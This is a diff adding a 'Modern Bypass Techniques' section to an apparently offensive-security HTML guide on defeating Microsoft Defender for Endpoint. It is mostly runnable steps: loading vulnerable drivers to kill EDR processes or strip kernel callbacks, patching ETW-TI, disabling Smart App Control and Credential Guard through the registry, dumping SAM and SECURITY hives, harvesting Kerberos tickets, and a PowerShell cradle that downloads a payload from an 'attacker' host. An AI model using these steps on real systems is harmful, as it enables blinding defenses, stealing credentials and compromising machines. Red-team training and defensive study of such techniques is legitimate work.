@@ -460,6 +460,230 @@ cscript C:\Windows\Tasks\evil.vbs
 Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Tasks\payload.exe -User $env:USERNAME
 # Should return: PolicyDecision = Allowed</code></pre>
 
+        <h2>Modern Bypass Techniques (2024–2025)</h2>
+        <p>These techniques target current MDE/Defender implementations. Detection rates change quickly as signatures and behavioral rules are updated — always test in a lab before deploying in an engagement.</p>
+
+        <h3>BYOVD — Bring Your Own Vulnerable Driver</h3>
+        <p>Loading a signed but vulnerable kernel driver to execute arbitrary kernel code. Used to kill EDR processes, disable PPL (Protected Process Light), or remove kernel callbacks registered by MDE. Microsoft's HVCI (Hypervisor-Protected Code Integrity) blocks most BYOVD when enabled, but many enterprise systems still have it disabled.</p>
+        <pre><code># Check if HVCI is enabled (BYOVD mitigation):
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object VirtualizationBasedSecurityStatus, VirtualizationBasedSecurityProperties
+
+# LOLDrivers — database of known vulnerable signed drivers:
+# https://www.loldrivers.io/
+# Key vulnerable drivers used in BYOVD attacks:
+# RTCore64.sys (MSI Afterburner) — arbitrary kernel R/W
+# gdrv.sys (GIGABYTE) — arbitrary kernel R/W, ring-0 execution
+# mhyprot2.sys (Genshin Impact anti-cheat) — process termination from kernel
+# procexp.sys (Sysinternals) — process handle operations
+
+# Technique overview (RTCore64.sys example):
+# 1. Drop RTCore64.sys to disk
+# 2. Create a service and load the driver:
+sc.exe create RTCore64 type= kernel start= auto binPath= C:\Windows\Temp\RTCore64.sys
+sc.exe start RTCore64
+# 3. Send IOCTL to the driver to get kernel R/W primitives
+# 4. Enumerate and NULL out EDR kernel callback routines
+# 5. MDE/Defender loses visibility — sensors effectively blinded
+
+# Kill protected processes via vulnerable driver IOCTL:
+# Tools: Backstab (uses procexp152.sys), EDRSandblast, Terminator
+# Backstab — kill EDR protected processes using ProcExp driver:
+# Backstab.exe --name MsSense.exe --kill      # Kill MDE sensor
+# Backstab.exe --name MsMpEng.exe --kill      # Kill Defender engine
+
+# Terminator tool (Spyboy technique) — uses vulnerable Zemana driver:
+# Sends IOCTL 0x80002048 to terminate any process including PPL processes
+# ZAM64.sys driver — signed, passes WHQL, kills arbitrary processes</code></pre>
+
+        <h3>Kernel Callback Removal (EDRSandblast / EDRKillShift)</h3>
+        <p>MDE registers kernel callbacks (PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine, ObRegisterCallbacks) to monitor process creation, DLL loading, and handle operations. Removing these callbacks blinds the EDR without terminating processes — harder to detect than process kills.</p>
+        <pre><code># Kernel callback removal overview:
+# 1. Exploit a vulnerable kernel driver for read/write primitives
+# 2. Walk the undocumented kernel callback arrays (PspCreateProcessNotifyRoutine, etc.)
+# 3. Find entries belonging to MDE (MsSense.exe / WdFilter.sys)
+# 4. NULL or NOP those callback entries
+# 5. EDR kernel hooks are removed — no process visibility
+
+# EDRSandblast — automated callback removal + LSASS dump:
+# EDRSandblast.exe --kernelmode     # Remove kernel callbacks via RTCore64
+# EDRSandblast.exe --usermode       # Remove userland hooks from ntdll
+# EDRSandblast.exe --dump           # Dump LSASS after removing protections
+
+# Callback arrays removed by EDRSandblast:
+# PspCreateProcessNotifyRoutine    — process creation events
+# PspCreateThreadNotifyRoutine     — thread creation events
+# PspLoadImageNotifyRoutine        — DLL/image load events
+# ObProcessCallbacks               — process handle requests
+# ObThreadCallbacks                — thread handle requests
+
+# ETW-TI (Threat Intelligence) provider removal:
+# ETW-TI is a kernel ETW provider that feeds MDE with high-fidelity telemetry
+# Disabling it: patch EtwThreatIntProvRegHandle in ntoskrnl.exe to 0
+# This kills a significant portion of MDE's behavioral telemetry
+
+# Check ETW-TI status (from kernel context):
+# Look for: EtwRegisterSecurityProvider calls in ntoskrnl</code></pre>
+
+        <h3>PPL (Protected Process Light) Bypass</h3>
+        <p>MDE runs as a PPL-Antimalware process. Standard admin cannot open a handle with PROCESS_TERMINATE or read/write access to PPL processes. Bypassing PPL is required to kill or dump MDE sensor processes.</p>
+        <pre><code># What PPL protects:
+# MsSense.exe (MDE Sensor) — PPL-Antimalware level
+# MsMpEng.exe (Defender Engine) — PPL-Antimalware level
+# WdFilter.sys — kernel minifilter, can't be unloaded by admin
+
+# PPL bypass via BYOVD (kernel-level attack):
+# Vulnerable driver provides kernel R/W → patch PS_PROTECTION byte in EPROCESS
+# EPROCESS.Protection offset varies by Windows build — need symbol resolution
+
+# PPL bypass via PPLdump / PPLFault (CVE-2022-21551 style):
+# Some bypass techniques abuse cross-process handle inheritance or Section objects
+# PPLFault exploits a race condition in Windows kernel for PPL process dumping
+
+# Token impersonation to become TrustedInstaller:
+# Even with TrustedInstaller, PPL processes are protected — kernel bypass required
+
+# Practical check — can you open MDE sensor process?
+$handle = [System.Diagnostics.Process]::GetProcessesByName("MsSense")
+# If Protection is set, OpenProcess with PROCESS_TERMINATE will fail with
+# Error 5: Access Denied</code></pre>
+
+        <h3>Smart App Control (SAC) Bypass</h3>
+        <p>Smart App Control (Windows 11) uses cloud-based reputation checking (AppLocker + WDAC + Intelligent Security Graph) to block unsigned or unknown executables. Introduced in Windows 11 22H2, it's separate from Defender and cannot be disabled via PowerShell cmdlets.</p>
+        <pre><code># Check SAC state:
+reg query HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy /v VerifiedAndReputablePolicyState
+# 0 = Off, 1 = Evaluation, 2 = On
+
+# SAC bypass techniques:
+# 1. Code signing — sign your payload with a valid EV certificate
+#    Purchased or stolen codesigning certs bypass SAC reputation checks
+
+# 2. LNK/ISO/VHD delivery (SAC doesn't scan container attachments the same way):
+#    Files extracted from ISO/VHD may inherit Mark-of-the-Web differently
+
+# 3. Catalog file abuse:
+#    Windows file catalog (.cat) files bind file hashes to trusted catalogs
+#    If a file is listed in a Microsoft-signed catalog, SAC trusts it
+#    Replace file contents while preserving the catalog binding (same hash = must match, so this is limited)
+
+# 4. Trusted installer paths:
+#    SAC applies to user-initiated execution, not all system paths equally
+#    Execution from C:\Windows\* paths may bypass SAC in some configs
+
+# 5. SAC only applies to PE files — scripts, DLLs loaded reflectively, etc. may not be checked
+
+# Disable SAC entirely (requires reinstall or registry + reboot):
+reg add HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f
+# Requires reboot. May trigger security alerts in managed environments.</code></pre>
+
+        <h3>Credential Guard Bypass</h3>
+        <p>Credential Guard (VBS — Virtualization-Based Security) isolates LSASS in a separate VSM (Virtual Secure Mode) process, preventing credential extraction via direct LSASS dump. It protects domain credentials but not local hashes stored in SAM/SECURITY.</p>
+        <pre><code># Check if Credential Guard is active:
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesRunning
+# 1 = CredentialGuard running
+# If active: LSASS dump will show placeholder values, not real NT hashes
+
+# What Credential Guard DOES NOT protect:
+# - SAM hive (local accounts) — still dumpable via reg save
+# - LSA secrets (service account passwords) — still in SECURITY hive
+# - Cached credentials (domain account hash cache) — in SECURITY hive
+# - Web browser credentials — separate storage
+# - DPAPI master keys — protected differently
+
+# Attacks that still work with Credential Guard active:
+# 1. SAM dump (local accounts):
+reg save HKLM\SAM C:\Windows\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak
+secretsdump.py -sam sam.bak -system sys.bak LOCAL
+
+# 2. Cached credential hash extraction (DCC2):
+reg save HKLM\SECURITY C:\Windows\Temp\sec.bak
+secretsdump.py -security sec.bak -system sys.bak LOCAL
+# Returns DCC2 hashes — not directly usable for PTH but crackable offline
+
+# 3. Kerberos ticket harvesting (tickets in volatile memory, not in Credential Guard store):
+Rubeus.exe dump /nowrap
+# Export current TGTs/service tickets — usable for PTT
+
+# 4. DPAPI key abuse (if you have local admin):
+# DPAPI master keys are not in Credential Guard's scope
+# Mimikatz: dpapi::masterkey /rpc (still works to decrypt DPAPI blobs)
+
+# 5. Token impersonation / delegation abuse:
+# Credentials used via Kerberos delegation flow through network — capturable
+
+# Force Credential Guard off (if not MDM/UEFI locked):
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f
+# Requires reboot. Will be flagged by MDE in most deployments.</code></pre>
+
+        <h3>Defender Antivirus Engine Bypass — In-Memory Execution</h3>
+        <p>Defender's real-time scanner focuses on files written to disk and memory regions flagged by system calls. Keeping malicious code exclusively in memory and loading via reflection or shellcode injection avoids file-based signatures entirely.</p>
+        <pre><code># Reflective DLL injection — load a DLL without writing it to disk:
+# The DLL is downloaded as bytes and loaded directly into memory
+# No file is ever written — Defender's on-access scanner has nothing to scan
+
+# PowerShell — download and execute entirely in memory:
+$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/payload.bin')
+# Decrypt/decrypt bytes in memory, then execute via shellcode runner
+
+# Sleep obfuscation — encrypt shellcode during sleep intervals:
+# MDE's periodic memory scans (AMScan) scan live process memory
+# Encrypting shellcode when not executing prevents memory scan detection
+# Implementations: Ekko, Foliage, Cronos sleep obfuscation
+# These XOR/RC4 the shellcode region, then restore before execution
+
+# Heap encryption (Cobalt Strike and custom implants):
+# Encrypt the heap containing beacon config/shellcode during sleep
+# Decrypt only when active — memory scans during sleep find only ciphertext
+
+# Syscall obfuscation — avoid syscall stubs being fingerprinted:
+# Hell's Gate / Halo's Gate — dynamically resolve syscall numbers at runtime
+# Indirect syscalls (call via ntdll gadget) — return address points to ntdll
+# Avoiding direct jmp/call patterns to syscall numbers
+
+# Stack spoofing — fake call stack to appear legitimate during scanning:
+# MDE checks the call stack of suspended threads for suspicious patterns
+# Stack spoofers (e.g., ThreadStackSpoofer, SilentMoonwalk) forge return addresses
+# Makes shellcode thread appear to have been called from a legitimate module
+
+# PE stomping / module stomping:
+# Map a legitimate DLL, overwrite its .text section with shellcode
+# Memory appears to belong to a signed, legitimate DLL path
+# VAD (Virtual Address Descriptor) shows the legitimate backing file</code></pre>
+
+        <h3>Microsoft Defender for Endpoint — Sensor Disruption</h3>
+        <p>MDE's telemetry pipeline depends on several components: the WdFilter.sys minifilter, the MsSense.exe sensor process, ETW-TI providers, and cloud connectivity. Disrupting any of these degrades detection capability.</p>
+        <pre><code># MDE components and disruption points:
+# WdFilter.sys    — kernel minifilter, blocks protected processes
+# MsSense.exe     — userland sensor (PPL-AM protected)
+# SenseCncProxy   — command and control connectivity to MDE cloud
+# MpCmdRun.exe    — management interface (can be used to check status)
+
+# Check MDE sensor connectivity:
+sc query sense
+# State: RUNNING / STOPPED
+
+# MDE cloud connectivity check — if blocked, cloud detections fail:
+# MDE phones home to *.securitycenter.windows.com / *.atp.azure.com
+# Block these domains at firewall/host — degrades cloud IOC lookups and response
+
+# Disrupt MDE telemetry via ETW provider manipulation:
+# MDE relies heavily on Microsoft-Windows-Threat-Intelligence ETW provider (ETW-TI)
+# Patching EtwThreatIntProvRegHandle in ntoskrnl:
+# 1. Get kernel base via NtQuerySystemInformation
+# 2. Resolve EtwThreatIntProvRegHandle symbol offset
+# 3. Write 0 to that address via BYOVD kernel R/W
+# 4. ETW-TI stops collecting — MDE loses high-fidelity kernel events
+
+# Disable DiagTrack (Connected User Experiences — telemetry to Microsoft):
+sc stop DiagTrack
+sc config DiagTrack start= disabled
+# This disrupts Microsoft's cloud-side analysis but not the on-device sensor
+
+# Registry: disable MDE heartbeat reporting:
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection" /v ForceDefenderPassiveMode /t REG_DWORD /d 1 /f
+# Puts MDE sensor in passive mode — reduces active blocking to detection-only</code></pre>
+
         <h2>Microsoft Defender — Threat Detection History</h2>
         <p><code>Get-MpThreat</code> and <code>Get-MpThreatDetection</code> reveal what Defender has detected on the system. Useful for situational awareness — check what tools or payloads have been caught, identify exact file paths that triggered detection, and understand detection timelines.</p>
         <pre><code># View all detected threats (name, ID, severity):
